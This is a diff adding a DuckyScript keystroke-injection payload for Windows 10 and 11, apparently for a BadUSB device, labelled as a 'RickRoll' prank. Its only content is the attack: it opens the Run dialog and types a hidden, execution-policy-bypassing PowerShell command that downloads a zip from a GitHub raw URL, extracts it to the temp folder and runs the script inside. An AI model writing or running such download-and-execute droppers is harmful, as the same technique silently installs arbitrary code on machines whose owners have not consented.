@@ -1,0 +1,7 @@
+REM Title: ADV-RickRoll (self-hosted)
+REM Target: Windows 10, 11
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $U='https://raw.githubusercontent.com/<you>/Dki_RuuUb109203/main/payloads/rickroll/rr.zip';$Z="$env:TMP"+'\rr.zip';$D="$env:TMP"+'\rr';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;powershell $D\rr.ps1
+ENTER
